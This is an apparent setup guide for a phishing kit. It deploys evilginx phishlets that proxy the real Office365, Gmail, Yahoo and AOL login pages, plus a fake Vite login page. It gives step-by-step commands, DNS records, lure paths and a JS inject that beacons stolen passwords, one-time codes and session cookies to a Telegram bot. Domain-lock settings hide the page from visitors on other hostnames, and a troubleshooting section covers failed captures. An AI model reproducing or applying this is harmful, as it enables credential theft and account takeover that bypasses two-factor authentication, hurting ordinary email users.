# VPS Setup Guide — All Providers on One Server

Complete step-by-step instructions for deploying this Vite project on a **single VPS** with support for **Outlook/Office365, Gmail, Yahoo, and AOL** — including evilginx proxy integration and Telegram notifications.

---

## Table of Contents

1. [Architecture Overview](#1-architecture-overview)
2. [Prerequisites](#2-prerequisites)
3. [Step 1 — Provision the VPS](#step-1--provision-the-vps)
4. [Step 2 — Install System Dependencies](#step-2--install-system-dependencies)
5. [Step 3 — Register a Domain and Configure DNS](#step-3--register-a-domain-and-configure-dns)
6. [Step 4 — Install and Configure Evilginx](#step-4--install-and-configure-evilginx)
7. [Step 5 — Deploy the Phishlets](#step-5--deploy-the-phishlets)
8. [Step 6 — Clone and Build the Vite Project](#step-6--clone-and-build-the-vite-project)
9. [Step 7 — Set Environment Variables](#step-7--set-environment-variables)
10. [Step 8 — Run the Node Server](#step-8--run-the-node-server)
11. [Step 9 — Set Up Reverse Proxy (Nginx)](#step-9--set-up-reverse-proxy-nginx)
12. [Step 10 — Create Evilginx Lures](#step-10--create-evilginx-lures)
13. [Telegram Integration](#telegram-integration)
14. [How Everything Connects](#how-everything-connects)
15. [Environment Variables Reference](#environment-variables-reference)
16. [Troubleshooting](#troubleshooting)

---

## 1. Architecture Overview

```
┌─────────────────────────────────────────────────────────────────────┐
│                         YOUR VPS                                    │
│                                                                     │
│  ┌──────────────────────┐     ┌──────────────────────────────────┐  │
│  │      Evilginx3       │     │     Node.js (server.js)          │  │
│  │  (Reverse Proxy)     │     │     - Serves Vite build (dist/)  │  │
│  │                      │     │     - POST /log/session endpoint │  │
│  │  Listens on 443/80   │     │     - Netlify function adapter   │  │
│  │                      │     │     - Sends to Telegram          │  │
│  │  Phishlets:          │     │     - Listens on PORT 10000      │  │
│  │   • o365.yaml        │     └──────────────────────────────────┘  │
│  │   • Yahoo.yaml       │                    ▲                      │
│  │   • gmail.yaml       │                    │ /log/session beacons │
│  │   • aol.yaml         │     ┌──────────────┴──────────────────┐  │
│  │                      │     │         Nginx (optional)         │  │
│  │  Subdomains:         │     │   Reverse proxy for Node app     │  │
│  │   office.domain.com  │     │   on the root domain             │  │
│  │   yahoo.domain.com   │     └─────────────────────────────────┘  │
│  │   gmail.domain.com   │                                          │
│  │   aol.domain.com     │                                          │
│  └──────────────────────┘                                          │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

**How the flow works:**

1. Visitor lands on your **root domain** (e.g., `yourdomain.com`) → served by the **Node.js server** → shows the Vite login page.
2. Visitor enters their email. The app detects the provider (Yahoo, AOL, Gmail, Outlook/Office365) and redirects the browser to the matching **evilginx subdomain** (e.g., `office.yourdomain.com`).
3. **Evilginx** proxies the real login page (e.g., `login.microsoftonline.com`), captures credentials and session cookies.
4. The **phishlet JS inject** sends credential/cookie beacons back to the Node.js server at `yourdomain.com/log/session`.
5. **server.js** receives the beacon and forwards it to your **Telegram bot** with provider-specific labels and cookie details.

**Yes, Telegram integration works perfectly** — it is the primary notification channel for both:
- Credentials captured on the Vite login page itself (sent via Netlify functions / `sendTelegram.js`)
- Session cookies captured by evilginx phishlets (sent via `POST /log/session` in `server.js`)

---

## 2. Prerequisites

- A **VPS** with at least 1 GB RAM and 1 vCPU (Ubuntu 22.04 or 24.04 recommended)
- A **domain name** you control (e.g., `yourdomain.com`)
- A **Telegram bot** (create one via @BotFather)
- Root/sudo access to the VPS
- Basic familiarity with the Linux command line

---

## Step 1 — Provision the VPS

Choose any VPS provider. Recommended options:
- **Railway** (has built-in support via `railway.json` in this project)
- **Render** / **DigitalOcean** / **Vultr** / **Linode** / **Hetzner**

For a manual VPS (DigitalOcean, Vultr, etc.):
1. Create a new server with **Ubuntu 22.04 LTS**
2. Choose at least **1 GB RAM** (2 GB recommended)
3. Set up SSH access
4. Note your server's **IP address**

```bash
# Connect to your VPS
ssh root@YOUR_SERVER_IP
```

---

## Step 2 — Install System Dependencies

```bash
# Update system packages
apt update && apt upgrade -y

# Install Node.js 18+ (using NodeSource)
curl -fsSL https://deb.nodesource.com/setup_18.x | bash -
apt install -y nodejs

# Verify Node.js and npm
node --version   # Should be v18.x or higher
npm --version

# Install Git
apt install -y git

# Install Nginx (reverse proxy for the Node app)
apt install -y nginx

# Install build tools (needed for some npm packages)
apt install -y build-essential

# Install Go (needed to build evilginx3)
apt install -y golang-go
# OR install the latest Go manually:
wget https://go.dev/dl/go1.22.0.linux-amd64.tar.gz
rm -rf /usr/local/go && tar -C /usr/local -xzf go1.22.0.linux-amd64.tar.gz
export PATH=$PATH:/usr/local/go/bin
echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
```

---

## Step 3 — Register a Domain and Configure DNS

You need **one domain** with wildcard subdomains pointing to your VPS.

### 3.1 — DNS Records

Add these DNS records at your domain registrar (e.g., Namecheap, Cloudflare):

| Type | Name              | Value            | TTL   |
|------|-------------------|------------------|-------|
| A    | `@`               | YOUR_SERVER_IP   | Auto  |
| A    | `*`               | YOUR_SERVER_IP   | Auto  |

The wildcard `*` record ensures that **all subdomains** (office, yahoo, gmail, aol, and all the proxy subdomains used by evilginx) resolve to your VPS.

> **Important:** If using Cloudflare, set the proxy status to **DNS only** (grey cloud) — not proxied. Evilginx needs direct TLS termination.

### 3.2 — Verify DNS

Wait for DNS propagation (usually 5–30 minutes), then verify:

```bash
dig +short yourdomain.com
dig +short office.yourdomain.com
dig +short yahoo.yourdomain.com
```

All should return your VPS IP address.

---

## Step 4 — Install and Configure Evilginx

### 4.1 — Build Evilginx

```bash
cd /opt
git clone https://github.com/kgretzky/evilginx2.git evilginx
cd evilginx

# Build evilginx (the repository is named evilginx2 but includes the latest version)
go build -o evilginx main.go
```

### 4.2 — Initial Configuration

```bash
# Run evilginx for the first time to set up
./evilginx -p /opt/evilginx/phishlets

# Inside the evilginx console, set your domain and IP:
config domain yourdomain.com
config ipv4 YOUR_SERVER_IP

# Important: Set the evilginx external address
config ipv4 external YOUR_SERVER_IP
```

> **Note:** Evilginx automatically requests TLS certificates from Let's Encrypt for each subdomain as phishlets are enabled.

### 4.3 — Port Configuration

Evilginx needs ports **443** (HTTPS) and **80** (HTTP for ACME challenges). If Nginx is running on those ports, stop it temporarily during evilginx setup:

```bash
# Stop Nginx temporarily so evilginx can bind to 443/80
systemctl stop nginx
```

You have two options:
- **Option A (Recommended):** Let evilginx handle ports 443/80 for phishlet subdomains, and have it redirect the root domain to the Node app on port 10000.
- **Option B:** Use Nginx on the root domain and configure evilginx to listen on alternate ports (more complex).

For simplicity, **Option A** is described here.

---

## Step 5 — Deploy the Phishlets

### 5.1 — Copy Phishlet Files

The repository includes 4 phishlet YAML files at the **project root**. Copy them to evilginx's phishlet directory:

```bash
# Copy phishlet files from your project to evilginx
cp /opt/hcgate/o365.yaml /opt/evilginx/phishlets/
cp /opt/hcgate/Yahoo.yaml /opt/evilginx/phishlets/
cp /opt/hcgate/gmail.yaml /opt/evilginx/phishlets/
cp /opt/hcgate/aol.yaml /opt/evilginx/phishlets/
```

### 5.2 — Phishlet Subdomain Mapping

Each phishlet uses a specific **landing subdomain** (`phish_sub`):

| Phishlet   | Landing Subdomain    | What It Proxies                          |
|------------|----------------------|------------------------------------------|
| `o365`     | `office.yourdomain.com`  | login.microsoftonline.com, login.live.com, outlook.live.com, outlook.office365.com |
| `Yahoo`    | `yahoo.yourdomain.com`   | login.yahoo.com, mail.yahoo.com, guce.yahoo.com |
| `gmail`    | `gmail.yourdomain.com`   | accounts.google.com, mail.google.com, myaccount.google.com |
| `aol`      | `aol.yourdomain.com`     | login.aol.com, mail.aol.com             |

### 5.3 — Enable Phishlets in Evilginx

> **Note on phishlet names:** The phishlet name in evilginx commands must match the YAML filename (without extension). `Yahoo` is capitalized because the file is `Yahoo.yaml`. The others (`o365`, `gmail`, `aol`) are lowercase.

Inside the evilginx console:

```
# Enable each phishlet one by one
phishlets hostname o365 yourdomain.com
phishlets enable o365

phishlets hostname Yahoo yourdomain.com
phishlets enable Yahoo

phishlets hostname gmail yourdomain.com
phishlets enable gmail

phishlets hostname aol yourdomain.com
phishlets enable aol
```

Wait for evilginx to obtain TLS certificates for each subdomain (it uses Let's Encrypt automatically).

### 5.4 — Verify Phishlets

```
# Check phishlet status
phishlets

# Should show all 4 phishlets as "enabled" with valid certificates
```

---

## Step 6 — Clone and Build the Vite Project

```bash
# Clone the repository
cd /opt
git clone https://github.com/Gaby2026x/hcgate.git
cd hcgate

# Install Node.js dependencies
npm install

# Install Netlify function dependencies
cd netlify/functions && npm install && cd ../..

# Build the Vite project (creates dist/ folder)
npm run build
```

> The build command embeds `VITE_*` environment variables into the JavaScript bundle. You **must set the VITE_ variables before building** (see Step 7).

---

## Step 7 — Set Environment Variables

### 7.1 — Create an .env File

Create a `.env` file in the project root:

```bash
nano /opt/hcgate/.env
```

Add the following variables:

```env
# === Server Configuration ===
PORT=10000

# === Domain Lock (optional but recommended) ===
# Set to your root domain to restrict access
LOGIN_HOST=yourdomain.com

# === Evilginx Domain (CRITICAL — set this to activate proxy mode) ===
# This is a VITE_ variable — it gets embedded in the build at compile time.
# Set this to your domain BEFORE running npm run build.
VITE_EVILGINX_DOMAIN=yourdomain.com

# === Client-Side Domain Lock (optional) ===
# Blank white page for visitors on the wrong subdomain
VITE_LOGIN_HOST=yourdomain.com

# === Telegram Notifications ===
TELEGRAM_BOT_TOKEN=1234567890:ABCdefGHIjklMNOpqrsTUVwxyz
TELEGRAM_CHAT_ID=-1001234567890

# === Upstash Redis (for session storage) ===
UPSTASH_REDIS_REST_URL=https://your-redis-url.upstash.io
UPSTASH_REDIS_REST_TOKEN=your-redis-token-here
```

### 7.2 — Export Variables and Rebuild

Since `VITE_` variables are baked into the build at compile time, you must export them and rebuild:

```bash
# Export the critical VITE_ variables
export VITE_EVILGINX_DOMAIN=yourdomain.com
export VITE_LOGIN_HOST=yourdomain.com

# Rebuild the Vite project with the new env vars embedded
npm run build
```

### 7.3 — What Each Variable Does

| Variable | Where Used | Purpose |
|----------|-----------|---------|
| `VITE_EVILGINX_DOMAIN` | **Build-time** (App.tsx) | When set, provider buttons redirect to evilginx subdomains instead of internal SPA routes. **This is the key variable that activates proxy mode.** |
| `VITE_LOGIN_HOST` | **Build-time** (App.tsx) | Client-side domain lock. Shows blank page if visited from the wrong hostname. |
| `PORT` | **Runtime** (server.js) | Port the Node.js Express server listens on. Defaults to `10000`. |
| `LOGIN_HOST` | **Runtime** (server.js) | Server-side domain lock. Returns blank 404 for wrong hostnames. |
| `TELEGRAM_BOT_TOKEN` | **Runtime** (server.js + Netlify functions) | Your Telegram bot's API token. |
| `TELEGRAM_CHAT_ID` | **Runtime** (server.js + Netlify functions) | The Telegram chat/group/channel ID to receive notifications. |
| `UPSTASH_REDIS_REST_URL` | **Runtime** (Netlify functions) | Redis REST API endpoint for session storage. |
| `UPSTASH_REDIS_REST_TOKEN` | **Runtime** (Netlify functions) | Redis authentication token. |

---

## Step 8 — Run the Node Server

### 8.1 — Test Run

```bash
cd /opt/hcgate

# Set runtime env vars
export PORT=10000
export TELEGRAM_BOT_TOKEN="your_bot_token"
export TELEGRAM_CHAT_ID="your_chat_id"
export UPSTASH_REDIS_REST_URL="your_redis_url"
export UPSTASH_REDIS_REST_TOKEN="your_redis_token"
export LOGIN_HOST=yourdomain.com

# Start the server
node server.js
# Should print: "Server running on port 10000"
```

### 8.2 — Run as a Background Service (systemd)

Create a systemd service so the Node server starts automatically:

```bash
nano /etc/systemd/system/hcgate.service
```

Paste:

```ini
[Unit]
Description=HCGate Node.js Server
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/opt/hcgate
ExecStart=/usr/bin/node server.js
Restart=on-failure
RestartSec=10
Environment=PORT=10000
Environment=LOGIN_HOST=yourdomain.com
Environment=TELEGRAM_BOT_TOKEN=your_bot_token
Environment=TELEGRAM_CHAT_ID=your_chat_id
Environment=UPSTASH_REDIS_REST_URL=your_redis_url
Environment=UPSTASH_REDIS_REST_TOKEN=your_redis_token

[Install]
WantedBy=multi-user.target
```

Then enable and start:

```bash
systemctl daemon-reload
systemctl enable hcgate
systemctl start hcgate
systemctl status hcgate   # Verify it's running
```

---

## Step 9 — Set Up Reverse Proxy (Nginx)

Since evilginx handles TLS for the phishlet subdomains (office/yahoo/gmail/aol), you need Nginx to proxy the **root domain** traffic to the Node.js server.

> **Note:** If evilginx is managing all ports 443/80, you can configure evilginx to proxy the root domain to your Node app instead of using Nginx. Alternatively, run Nginx on a different port or use evilginx's built-in redirect capabilities.

### Option A — Evilginx Handles All TLS

If evilginx controls ports 443/80, the root domain (`yourdomain.com`) traffic also goes through evilginx. You can configure a static redirect or proxy in evilginx to forward root domain requests to `localhost:10000`.

### Option B — Nginx for Root Domain

If you need the root domain to have its own TLS certificate managed separately:

```bash
# Install Certbot for TLS certificates
apt install -y certbot python3-certbot-nginx

# Create Nginx config
nano /etc/nginx/sites-available/hcgate
```

```nginx
server {
    listen 80;
    server_name yourdomain.com;
    
    location / {
        proxy_pass http://127.0.0.1:10000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_cache_bypass $http_upgrade;
    }
}
```

```bash
# Enable the site
ln -s /etc/nginx/sites-available/hcgate /etc/nginx/sites-enabled/
rm /etc/nginx/sites-enabled/default  # Remove default site

# Test and reload Nginx
nginx -t
systemctl restart nginx

# Get TLS certificate (only if Nginx handles the root domain's TLS)
certbot --nginx -d yourdomain.com
```

---

## Step 10 — Create Evilginx Lures

Lures are the URLs you distribute. The Vite app redirects to `https://<provider>.<domain>/login` — so you **must** create lures with a custom path of `/login` for each phishlet.

Inside the evilginx console:

```
# Create lures for each provider with the /login path
lures create o365
lures edit 0 path /login
lures edit 0 redirect_url https://www.adobe.com

lures create Yahoo
lures edit 1 path /login
lures edit 1 redirect_url https://www.adobe.com

lures create gmail
lures edit 2 path /login
lures edit 2 redirect_url https://www.adobe.com

lures create aol
lures edit 3 path /login
lures edit 3 redirect_url https://www.adobe.com

# Verify lures
lures
```

The lure URLs will be:
- `https://office.yourdomain.com/login` → Office365/Outlook login
- `https://yahoo.yourdomain.com/login` → Yahoo login
- `https://gmail.yourdomain.com/login` → Gmail login
- `https://aol.yourdomain.com/login` → AOL login

> **Critical:** The `/login` path must match what the Vite app uses in `PROVIDER_URLS` (see `src/App.tsx`). If you change the path here, you must update `App.tsx` and rebuild.

> **Why `/login`?** Evilginx requires a valid lure to create a session. Without a matching lure path, evilginx will redirect visitors to YouTube (its default redirect). The Vite app sends users to `https://<subdomain>.yourdomain.com/login`, so the lure must have `path /login` to match.

> **You don't distribute these lure URLs directly.** Instead, you distribute your **root domain** URL (e.g., `https://yourdomain.com`). The Vite login page handles email detection and automatically redirects visitors to the correct evilginx subdomain.

---

## Telegram Integration

### Does Telegram Still Work? **Yes, 100%.**

Telegram integration works through **two independent channels**:

### Channel 1 — Vite Login Page Credentials

When a user enters credentials on the Vite login page (your root domain):
1. `handleLoginSuccess` in `App.tsx` collects: email, password, browser fingerprint, user agent, timestamp
2. Sends a POST to `/.netlify/functions/sendTelegram`
3. `server.js` adapts this to the `sendTelegram.js` Netlify function
4. The function sends the data to your Telegram bot

### Channel 2 — Evilginx Session Cookie Beacons

When a user completes authentication on the evilginx-proxied real login page:
1. The phishlet's **JS inject** captures session cookies and credentials
2. It sends a POST beacon to `yourdomain.com/log/session` (strips first subdomain from current hostname to find the root domain)
3. `server.js` receives the beacon at the `POST /log/session` route
4. It decodes the base64-encoded cookies, identifies the provider, and formats a Telegram message
5. Sends to Telegram with provider-specific emoji labels:
   - 🔵 Office365/Outlook
   - 🟡 Yahoo
   - 🟠 AOL
   - 🔴 Gmail

### Setting Up Your Telegram Bot

```
1. Open Telegram, search for @BotFather
2. Send /newbot
3. Follow prompts — name your bot, get the API token
4. Copy the token → this is your TELEGRAM_BOT_TOKEN

5. Create a group/channel and add your bot to it
6. Send a test message in the group
7. Visit: `https://api.telegram.org/bot{YOUR_TOKEN}/getUpdates`
8. Find the chat ID in the response → this is your TELEGRAM_CHAT_ID
   (Group IDs start with -100)
```

---

## How Everything Connects

### Complete User Flow

```
User visits yourdomain.com
        │
        ▼
  ┌─────────────────────────────────────────┐
  │  Node.js serves Vite build (dist/)      │
  │  Login page displays                     │
  │  User enters email: user@outlook.com     │
  └───────────────────┬─────────────────────┘
                      │
        handleOthersEmailSubmit()
        detects: outlook.com → Microsoft
                      │
                      ▼
  ┌─────────────────────────────────────────┐
  │  window.location.href = redirect to:    │
  │  https://office.yourdomain.com/...      │
  │  (PROVIDER_URLS.MICROSOFT)              │
  └───────────────────┬─────────────────────┘
                      │
                      ▼
  ┌─────────────────────────────────────────┐
  │  Evilginx proxies real MS login page    │
  │  User sees real login.microsoftonline   │
  │  Enters password, completes 2FA         │
  │                                         │
  │  Phishlet captures:                     │
  │   • Session cookies (ESTSAUTH, etc.)    │
  │   • Username/password/OTP               │
  └───────────────────┬─────────────────────┘
                      │
        JS inject sends beacon to
        yourdomain.com/log/session
                      │
                      ▼
  ┌─────────────────────────────────────────┐
  │  server.js /log/session                 │
  │  Decodes cookies, detects provider      │
  │  Sends formatted message to Telegram    │
  │  with 🔵 O365 label + cookie details    │
  └─────────────────────────────────────────┘
```

### Email Domain Detection

The Vite app automatically routes emails to the correct provider:

| Email Domain | Detected As | Redirects To |
|-------------|-------------|--------------|
| outlook.com, hotmail.com, live.com, msn.com | Microsoft | `office.yourdomain.com` |
| Any Office365 business domain (detected via MS OpenID) | Microsoft | `office.yourdomain.com` |
| yahoo.com, ymail.com, att.net, sbcglobal.net, bellsouth.net, verizon.net | Yahoo | `yahoo.yourdomain.com` |
| aol.com, compuserve.com, aim.com, cs.com | AOL | `aol.yourdomain.com` |
| gmail.com, googlemail.com | Gmail | `gmail.yourdomain.com` |
| Any other domain | Others | Internal password page |

---

## Environment Variables Reference

### Build-Time Variables (must be set BEFORE `npm run build`)

```env
# Evilginx proxy domain — REQUIRED to activate proxy mode
VITE_EVILGINX_DOMAIN=yourdomain.com

# Client-side domain lock — optional, shows blank page on wrong host
VITE_LOGIN_HOST=yourdomain.com
```

### Runtime Variables (must be set when running `node server.js`)

```env
# Server port (default: 10000)
PORT=10000

# Server-side domain lock — optional
LOGIN_HOST=yourdomain.com

# Telegram bot credentials — REQUIRED for notifications
TELEGRAM_BOT_TOKEN=1234567890:ABCdefGHIjklMNOpqrsTUVwxyz
TELEGRAM_CHAT_ID=-1001234567890

# Upstash Redis — REQUIRED for session storage
UPSTASH_REDIS_REST_URL=https://your-redis-url.upstash.io
UPSTASH_REDIS_REST_TOKEN=your-redis-token-here
```

---

## Troubleshooting

### "Office365 redirects to YouTube instead of the login page"
- This means evilginx can't find a matching lure for the URL path.
- You must create a lure with `path /login` (see Step 10 above).
- Run: `lures create o365`, then `lures edit 0 path /login`
- Without a lure matching the path, evilginx redirects to its default URL (YouTube).
- Also verify the phishlet is enabled: run `phishlets` in the evilginx console.

### "Yahoo phishlet refuses to enable"
- The phishlet YAML may have duplicate `phish_sub` values. Each proxy host must have a **unique** `phish_sub`.
- This was fixed in this version: `yahoocdn.com` now uses `scdn`/`ocdn` and `gstatic.com` uses `gstatic` instead of reusing `s` and `www`.
- If using an older YAML, update the phishlet file and reload: `phishlets hostname Yahoo yourdomain.com`

### "Gmail lure not working"
- Ensure you created a lure with `path /login` (see Step 10).
- Ensure the gmail phishlet is enabled: `phishlets enable gmail`
- Google actively blocks proxied requests — verify you have valid TLS certs: `phishlets`

### "AOL has broken images / broken background"
- This was caused by missing `text/css` MIME type in the yimg.com sub_filters.
- The updated `aol.yaml` adds `text/css` to all yimg.com sub_filters so CSS background-image URLs are properly rewritten.
- Re-copy the updated phishlet: `cp /opt/hcgate/aol.yaml /opt/evilginx/phishlets/ && phishlets hostname aol yourdomain.com`

### "AOL login shows an error"
- AOL uses Yahoo's auth infrastructure. Ensure the yimg.com CDN subdomain is resolving correctly.
- Run: `dig +short s.yourdomain.com` — should return your VPS IP.
- Check evilginx logs for TLS or proxy errors.

### "Provider buttons don't redirect to evilginx"
- You forgot to set `VITE_EVILGINX_DOMAIN` **before** building.
- `VITE_*` variables are baked in at build time — they must be set before `npm run build`.
- Run: `export VITE_EVILGINX_DOMAIN=yourdomain.com && npm run build`
- On Railway: Set the variable in the dashboard, then redeploy (Railway rebuilds on env var changes).

### "DNS not resolving for subdomains"
- Ensure you have a wildcard `*` A record pointing to your VPS IP.
- Wait for DNS propagation (use `dig +short subdomain.yourdomain.com` to check).

### "Evilginx can't get TLS certificates"
- Ensure ports 80 and 443 are not blocked by a firewall.
- Ensure no other service (Nginx, Apache) is using port 80/443.
- Run `ufw allow 80 && ufw allow 443` if using UFW.

### "Telegram notifications not arriving"
- Verify `TELEGRAM_BOT_TOKEN` and `TELEGRAM_CHAT_ID` are set correctly.
- Test with: `curl "https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text=test"`
- Ensure the bot is added to the target chat/group.

### "Blank page on visit"
- If `LOGIN_HOST` or `VITE_LOGIN_HOST` is set, the page only shows on that exact hostname.
- Unset these variables for testing, or ensure you're accessing via the correct hostname.

### "/log/session beacons not arriving"
- The phishlet JS inject strips the first subdomain to find the root domain for beacons.
- Example: visiting `office.yourdomain.com` → beacons go to `yourdomain.com/log/session`.
- Ensure `yourdomain.com` is accessible and the Node server is running.

### Railway Deployment (Alternative to Manual VPS)

This project includes a `railway.json` for Railway deployment.

> **Important:** Railway does **not** support evilginx (it doesn't allow binding to ports 80/443 or raw TCP). You can use Railway for the **Node.js frontend only** while running evilginx on a separate VPS. See the two-server architecture below.

#### Railway for Node.js Frontend Only

1. Push to GitHub
2. Connect Railway to your GitHub repo
3. Set environment variables in Railway dashboard:
   - `VITE_EVILGINX_DOMAIN=yourdomain.com` (your evilginx VPS domain)
   - `TELEGRAM_BOT_TOKEN=your_bot_token`
   - `TELEGRAM_CHAT_ID=your_chat_id`
   - `UPSTASH_REDIS_REST_URL=your_redis_url`
   - `UPSTASH_REDIS_REST_TOKEN=your_redis_token`
4. Railway will automatically build and deploy using `railway.json`
5. Set up a custom domain in Railway for your root domain (e.g., `yourdomain.com`)
6. Point your root domain DNS to Railway (CNAME record)
7. Point wildcard subdomains (`*.yourdomain.com`) to your evilginx VPS IP (A record)

#### Two-Server Architecture (Railway + VPS)

```
     Root domain (yourdomain.com)           Subdomains (*.yourdomain.com)
              │                                        │
              ▼                                        ▼
    ┌──────────────────┐                     ┌──────────────────┐
    │     Railway       │                     │    VPS (evilginx) │
    │  Node.js server   │◄── /log/session ───│    Ports 80/443   │
    │  Serves Vite app  │    beacons          │    Phishlets      │
    │  Telegram notify  │                     │    TLS certs      │
    └──────────────────┘                     └──────────────────┘
```

DNS setup for two-server architecture:
| Type   | Name | Value                              |
|--------|------|------------------------------------|
| CNAME  | `@`  | your-railway-app.up.railway.app    |
| A      | `*`  | YOUR_VPS_IP                        |

---

## Quick Start Checklist

```
[ ] VPS provisioned with Ubuntu 22.04+
[ ] Domain registered with wildcard DNS (*.yourdomain.com → VPS IP)
[ ] Evilginx installed and configured with your domain
[ ] 4 phishlets (o365, Yahoo, gmail, aol) copied and enabled
[ ] TLS certificates obtained by evilginx for all subdomains
[ ] 4 lures created with path /login for each phishlet
[ ] Project cloned to /opt/hcgate
[ ] npm install + netlify/functions npm install completed
[ ] VITE_EVILGINX_DOMAIN exported and npm run build executed
[ ] server.js running (directly or via systemd)
[ ] TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID configured
[ ] Root domain (yourdomain.com) accessible and showing login page
[ ] Provider redirect working (email → correct evilginx subdomain)
[ ] Telegram notifications arriving for credential captures
```
